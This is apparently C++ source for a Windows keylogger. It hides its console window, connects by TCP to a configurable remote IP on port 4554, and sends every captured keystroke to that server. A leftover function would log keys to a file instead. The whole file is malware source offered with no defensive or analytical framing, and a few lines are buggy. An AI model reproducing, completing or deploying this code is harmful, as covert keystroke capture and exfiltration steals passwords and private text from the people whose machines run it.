#include <iostream>
#include <string>
#include <WS2tcpip.h>
#include <cstdlib>
#include <thread>
#pragma comment(lib, "ws2_32.lib")
#include <fstream>
#include <stdio.h>
#include <stdlib.h>

using namespace std;

bool ipExists;
string IP = "127.0.0.1";

int save(int _key, char *file);

void checkIP() {
	// [!] check if the file contains the IP; this part is still in development [!]
}

void getIP() {
	cout << "Enter the IP address:  ";
	getline(cin, IP);
	
	// writing to a file

	// [!] this portion of the program is still in development [!]
}

void Stealth() {
	HWND hWnd;
	AllocConsole();
	hWnd = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(hWnd, 0);
}

void cleanUp(SOCKET socket) {
	closesocket(socket);
	WSACleanup();
}

void mainMethod() {

	Stealth();
	FreeConsole();

	//IP = "127.0.0.1";		// ip to connect to
	int port = 4554;		// port to connect to

	// initialize winsock
	WSAData data;
	WORD ver = MAKEWORD(2, 2);
	int wsResult = WSAStartup(ver, &data);
	if (wsResult != 0) {
		cerr << "Can't start winsock | Error # " << wsResult << endl;
		return;
	}

	// create socket
	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET) {
		cerr << "[-] Error occured when creating a socket | Error # " << WSAGetLastError() << endl;
		WSACleanup();
		return;
	}

	// Fill in a hint structure
	sockaddr_in hint;
	hint.sin_family = AF_INET;
	hint.sin_port = htons(port);
	inet_pton(AF_INET, IP.c_str(), &hint.sin_addr);

	// connect to the server
	int connResult = connect(sock, (sockaddr*)&hint, sizeof(hint));
	if (connResult == SOCKET_ERROR) {
		cerr << "[-] Can't create socket | Error # " << WSAGetLastError << endl;
		closesocket(sock);
		WSACleanup();
		return;
	}

	// starting the keylogger
	char i;
	while (true) {
		//Sleep(10);
		for (i = 8; i <= 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				//save(i, "log.txt"); // instead of saving to a file, it will broadcast the keystrokes
				send(sock, &i, 2, 0); // sending the keystroke to the server
			}
		}
	}

	// close everything up
	closesocket(sock);
	WSACleanup();

}

int save(int _key, char *file) {
	cout << _key << endl;
	//Sleep(10);
	FILE *OUTPUT_FILE;

	OUTPUT_FILE = fopen(file, "a+");

	if (_key == VK_SHIFT) {
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	}
	if (_key == VK_CONTROL) {
		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	}
	if (_key == VK_BACK) {
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
	}
	if (_key == VK_LBUTTON) {
		fprintf(OUTPUT_FILE, "%s", "[MOUSE1]");
	}
	if (_key == VK_RBUTTON) {
		fprintf(OUTPUT_FILE, "%s", "[MOUSE2]");
	}
	if (_key == VK_RETURN) {
		fprintf(OUTPUT_FILE, "%s", "[ENTER]");
		fprintf(OUTPUT_FILE, "%s", "\n");
	}
	if (_key == VK_TAB) {
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
		fprintf(OUTPUT_FILE, "%s", "\n");
	}
	if (_key == VK_ESCAPE) {
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	}
	else {
		fprintf(OUTPUT_FILE, "%s", &_key);
		fclose(OUTPUT_FILE);
	}
	return 0;

}

void main() {
	mainMethod();
}